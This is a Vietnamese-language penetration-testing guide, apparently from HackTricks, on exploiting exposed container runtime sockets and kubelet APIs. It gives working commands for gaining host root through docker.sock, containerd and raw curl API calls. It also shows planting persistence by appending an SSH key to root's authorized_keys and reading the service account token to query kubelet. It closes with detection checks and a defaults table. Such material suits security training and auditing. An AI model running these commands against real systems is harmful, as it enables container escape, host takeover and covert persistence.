# API Runtime Và Mức Độ Phơi Lộ Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Tổng quan

Nhiều vụ xâm nhập container thực tế không bắt đầu bằng việc thoát khỏi namespace. Chúng bắt đầu từ quyền truy cập vào control plane của runtime. Nếu một workload có thể giao tiếp với `dockerd`, `containerd`, CRI-O, Podman hoặc kubelet thông qua Unix socket được mount hoặc TCP listener bị lộ, kẻ tấn công có thể yêu cầu tạo container mới với đặc quyền cao hơn, mount filesystem của host, tham gia các namespace của host hoặc lấy thông tin nhạy cảm về node. Trong những trường hợp đó, API runtime chính là ranh giới bảo mật thực sự, và việc xâm phạm nó gần như tương đương với xâm phạm host.

Đây là lý do cần ghi nhận riêng việc để lộ socket runtime, thay vì gộp chung với các biện pháp bảo vệ kernel. Một container có seccomp, capabilities và MAC confinement thông thường vẫn có thể chỉ cách việc xâm phạm host một lệnh gọi API nếu `/var/run/docker.sock` hoặc `/run/containerd/containerd.sock` được mount bên trong nó. Kernel isolation của container hiện tại có thể vẫn hoạt động đúng như thiết kế, trong khi management plane của runtime hoàn toàn bị lộ.

## Các mô hình truy cập daemon

Docker Engine thường cung cấp API đặc quyền thông qua Unix socket cục bộ tại `unix:///var/run/docker.sock`. Trước đây, API này cũng được cung cấp từ xa qua TCP listener như `tcp://0.0.0.0:2375` hoặc listener được bảo vệ bằng TLS trên cổng `2376`. Việc để daemon truy cập từ xa mà không có TLS mạnh và xác thực client sẽ biến Docker API thành một giao diện root từ xa.

containerd, CRI-O, Podman và kubelet cũng có các bề mặt tấn công tương tự, với mức độ ảnh hưởng cao. Tên gọi và quy trình khác nhau, nhưng nguyên tắc thì không. Nếu giao diện cho phép người gọi tạo workload, mount đường dẫn của host, lấy credentials hoặc thay đổi container đang chạy, thì đó là một kênh quản lý có đặc quyền và cần được xử lý tương ứng.

Một giao diện web quản lý container có thể làm lộ cùng ranh giới bảo mật này mà không cần cấp cho tài khoản cục bộ quyền truy cập trực tiếp vào socket. Ví dụ, [Portainer issue #493](https://github.com/portainer/portainer/issues/493) ghi nhận lỗi đặt lại mật khẩu quản trị viên không cần xác thực trong bản dựng cũ 1.11.1. Chỉ xem UI có thể truy cập cục bộ là manh mối cần kiểm tra: hãy xác nhận bản dựng đã cài đặt và cơ chế xác thực, quyền kiểm soát thực tế của quản trị viên, cũng như liệu endpoint được quản lý có thể tạo container với bind mount host có quyền ghi hay không. [Portainer documents](https://docs.portainer.io/admin/environments/add/docker/socket) rằng việc quản lý dựa trên socket cần quyền truy cập vào Docker socket; endpoint rootless hoặc bị giới hạn sẽ làm thay đổi mức độ ảnh hưởng đến host. Không suy luận rằng có lỗi xác thực hoặc quyền truy cập root trên host chỉ dựa vào tên tiến trình, cổng hoặc chuỗi phiên bản.

Các đường dẫn cục bộ thường cần kiểm tra là:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Các stack cũ hơn hoặc chuyên biệt hơn cũng có thể để lộ các endpoint như `dockershim.sock`, `frakti.sock` hoặc `rktlet.sock`. Những endpoint này ít phổ biến hơn trong các môi trường hiện đại, nhưng khi gặp phải, cần thận trọng tương tự vì chúng là các bề mặt điều khiển runtime, chứ không phải socket ứng dụng thông thường.

## Truy cập từ xa an toàn

Nếu daemon phải được để lộ ngoài socket cục bộ, kết nối cần được bảo vệ bằng TLS và tốt nhất là dùng xác thực hai chiều để daemon xác minh client và client xác minh daemon. Thói quen cũ là mở Docker daemon qua HTTP thuần cho tiện lợi là một trong những sai lầm nguy hiểm nhất khi quản trị container, vì bề mặt API đủ mạnh để trực tiếp tạo container có đặc quyền.

Mẫu cấu hình Docker trước đây trông như sau:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Trên các host dùng systemd, giao tiếp với daemon cũng có thể xuất hiện dưới dạng `fd://`, nghĩa là tiến trình kế thừa một socket đã được systemd mở sẵn, thay vì tự bind trực tiếp. Điều quan trọng cần nhớ không phải là cú pháp cụ thể, mà là hệ quả về bảo mật. Ngay khi daemon lắng nghe trên phạm vi rộng hơn một socket cục bộ được phân quyền chặt chẽ, bảo mật truyền tải và xác thực client trở thành yêu cầu bắt buộc, không còn là biện pháp hardening tùy chọn.

## Khai thác

Nếu có runtime socket, hãy xác định đó là socket nào, có client tương thích hay không và có thể truy cập trực tiếp qua HTTP hoặc gRPC hay không:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Các lệnh này hữu ích vì chúng phân biệt được đường dẫn không còn tồn tại, socket đã mount nhưng không thể truy cập và API đặc quyền đang hoạt động. Nếu client kết nối thành công, câu hỏi tiếp theo là liệu API có thể khởi chạy container mới với bind mount của host hoặc dùng chung namespace của host hay không.

### Khi Không Cài Đặt Client

Không có `docker`, `podman` hoặc CLI thân thiện nào khác không có nghĩa là socket an toàn. Docker Engine giao tiếp qua HTTP trên Unix socket, còn Podman cung cấp cả API tương thích với Docker lẫn API Libpod gốc thông qua `podman system service`. Điều đó có nghĩa là một môi trường tối giản chỉ có `curl` vẫn có thể đủ để điều khiển daemon:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Điều này quan trọng trong giai đoạn post-exploitation vì đôi khi bên phòng thủ xóa các binary client thường dùng nhưng vẫn để socket quản lý được mount. Trên máy chủ Podman, hãy nhớ rằng đường dẫn có giá trị cao khác nhau giữa các triển khai rootful và rootless: `unix:///run/podman/podman.sock` cho các phiên bản dịch vụ rootful và `unix://$XDG_RUNTIME_DIR/podman/podman.sock` cho các phiên bản rootless.

### Ví dụ đầy đủ: Từ Docker Socket đến quyền root trên host

Nếu có thể truy cập `docker.sock`, cách thoát khỏi container kinh điển là khởi chạy một container mới, mount filesystem gốc của host, rồi `chroot` vào đó:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Điều này cho phép thực thi trực tiếp với quyền root trên host thông qua Docker daemon. Tác động không chỉ giới hạn ở việc đọc file. Khi đã vào container mới, kẻ tấn công có thể sửa đổi file trên host, thu thập thông tin xác thực, cài cắm cơ chế duy trì truy cập hoặc khởi chạy thêm các workload có đặc quyền.

### Ví dụ đầy đủ: Docker Socket đến namespace của host

Nếu kẻ tấn công muốn vào namespace thay vì chỉ truy cập filesystem:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Đường đi này tiếp cận host bằng cách yêu cầu runtime tạo một container mới với quyền truy cập rõ ràng vào các namespace của host, thay vì khai thác container hiện tại.

### Docker Socket Persistence Pattern

Có thể dùng quyền kiểm soát runtime để duy trì quyền truy cập, thay vì chỉ mở một shell dùng một lần. Mẫu tổng quát là tạo một helper container có host mount, ghi thông tin truy cập được cấp quyền hoặc startup hook vào filesystem được mount của host, rồi xác minh rằng host sử dụng chúng.

Dạng ví dụ:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Ý tưởng tương tự có thể nhắm đến các systemd unit, cron fragment, file khởi động ứng dụng hoặc SSH key, tùy vào điều operator muốn chứng minh. Điểm quan trọng là thay đổi bền vững được thực hiện thông qua quyền truy cập filesystem cấp host của runtime daemon, chứ không phải thông qua việc cấp thêm quyền cho container ban đầu.

### Raw Docker API Helper Pivot

Khi thiếu Docker CLI, có thể thực hiện cùng quy trình dùng host-mount helper thông qua HTTP trên Unix socket. Quy trình chung là: xác nhận API, tạo helper container với host bind mount, khởi chạy container, tạo exec instance rồi khởi chạy exec đó.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Yêu cầu `/exec/<id>/start` cuối cùng phụ thuộc vào exec ID được trả về, nhưng điểm bảo mật không phụ thuộc vào cách xử lý JSON cụ thể: chỉ cần truy cập API thô vào Docker daemon chạy bằng root là đủ để yêu cầu một workload hỗ trợ có quyền cao hơn.

### Ví dụ đầy đủ: Socket containerd

Socket `containerd` được mount thường cũng nguy hiểm tương tự:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Nếu có sẵn một client giống Docker hơn, `nerdctl` có thể tiện lợi hơn `ctr` vì nó cung cấp các cờ quen thuộc như `--privileged`, `--pid=host` và `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Tác động vẫn là chiếm quyền host. Ngay cả khi không có công cụ riêng của Docker, một runtime API khác vẫn có thể cung cấp quyền quản trị tương tự. Trên các node Kubernetes, `crictl` cũng có thể đủ để reconnaissance và tương tác với container vì nó giao tiếp trực tiếp với CRI endpoint.

### BuildKit Socket

Dễ bỏ sót `buildkitd` vì mọi người thường nghĩ đây “chỉ là backend để build”, nhưng daemon này vẫn là một control plane có đặc quyền. `buildkitd.sock` có thể truy cập được sẽ cho phép attacker chạy các build step tùy ý, kiểm tra các khả năng của worker, sử dụng local context từ môi trường đã bị compromise và yêu cầu các entitlement nguy hiểm như `network.host` hoặc `security.insecure` nếu daemon được cấu hình cho phép.

Các tương tác ban đầu hữu ích gồm:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Nếu daemon chấp nhận các yêu cầu build, hãy kiểm tra xem có các entitlement không an toàn hay không:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Tác động chính xác phụ thuộc vào cấu hình daemon, nhưng dịch vụ BuildKit chạy với quyền root và entitlements rộng không phải là tiện ích vô hại dành cho developer. Hãy xem đây là một bề mặt quản trị có giá trị cao khác, đặc biệt trên CI runner và các node build dùng chung.

### Kubelet API qua TCP

Kubelet không phải là container runtime, nhưng vẫn thuộc mặt phẳng quản lý node và thường nằm trong cùng phạm vi ranh giới tin cậy. Nếu workload có thể truy cập cổng bảo mật của kubelet `10250`, hoặc thông tin xác thực của node, kubeconfig hay quyền proxy bị lộ, kẻ tấn công có thể liệt kê Pod, lấy log hoặc thực thi lệnh trong các container cục bộ trên node mà không cần đi qua đường dẫn admission của Kubernetes API server.

Bắt đầu bằng các bước dò tìm đơn giản:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Nếu kubelet hoặc API-server proxy path cấp quyền `exec`, một client hỗ trợ WebSocket có thể biến việc đó thành code execution trong các container khác trên node. Đây cũng là lý do `nodes/proxy` chỉ có quyền `get` vẫn nguy hiểm hơn vẻ ngoài: request vẫn có thể đến các kubelet endpoint thực thi lệnh, và những tương tác trực tiếp đó với kubelet không xuất hiện trong Kubernetes audit logs thông thường.<sup>[[2]](#references)</sup>

## Checks

Mục tiêu của các kiểm tra này là xác định liệu container có thể truy cập bất kỳ management plane nào vốn phải nằm ngoài ranh giới tin cậy hay không.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Điều đáng chú ý ở đây:

- Socket runtime được mount thường là một primitive quản trị trực tiếp, chứ không chỉ đơn thuần làm lộ thông tin.
- Listener TCP trên `2375` không có TLS cần được xem là tình trạng có thể dẫn đến xâm nhập từ xa.
- Các biến môi trường như `DOCKER_HOST` thường cho thấy workload được thiết kế có chủ đích để giao tiếp với runtime trên host.

## Mặc định của runtime

| Runtime / nền tảng | Trạng thái mặc định | Hành vi mặc định | Cách cấu hình yếu đi thường gặp |
| --- | --- | --- | --- |
| Docker Engine | Mặc định dùng Unix socket cục bộ | `dockerd` lắng nghe trên socket cục bộ và daemon thường chạy với quyền root | mount `/var/run/docker.sock`, expose `tcp://...:2375`, TLS yếu hoặc không có trên `2376` |
| Podman | Mặc định dùng CLI không cần daemon | Không cần daemon đặc quyền chạy lâu dài cho các tác vụ cục bộ thông thường; socket API vẫn có thể được expose khi bật `podman system service` | expose `podman.sock`, chạy service trên phạm vi rộng, sử dụng API với quyền root |
| containerd | Socket đặc quyền cục bộ | API quản trị được expose qua socket cục bộ và thường được các công cụ cấp cao hơn sử dụng | mount `containerd.sock`, cấp quyền truy cập `ctr` hoặc `nerdctl` quá rộng, expose các namespace đặc quyền |
| CRI-O | Socket đặc quyền cục bộ | Endpoint CRI dành cho các thành phần đáng tin cậy chạy trên node | mount `crio.sock`, expose endpoint CRI cho workload không đáng tin cậy |
| Kubernetes kubelet | API quản lý cục bộ trên node | Kubelet không nên truy cập được rộng rãi từ các Pod; tùy thuộc vào authn/authz, quyền truy cập có thể làm lộ trạng thái Pod, thông tin xác thực và các tính năng thực thi | mount socket hoặc cert của kubelet, xác thực kubelet yếu, dùng host networking kết hợp với endpoint kubelet có thể truy cập được |

## References

- [1] [khai thác socket containerd phần 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Rủi ro vượt qua Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
